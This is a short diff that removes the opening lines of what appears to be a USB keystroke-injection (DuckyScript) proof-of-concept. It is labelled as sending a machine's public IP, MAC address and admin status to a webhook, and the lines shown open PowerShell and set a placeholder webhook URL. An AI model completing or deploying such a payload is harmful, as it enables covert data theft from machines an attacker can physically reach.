@@ -1,7 +1,0 @@
-REM By Joshua O' Brien
-REM POC of sending public IP , MAC address , admin privs ,
-REM Webhook POC v2
-DEFAULT_DELAY 500
-GUI r
-STRING powershell
-STRING $hookurl = '(webhook)' ;
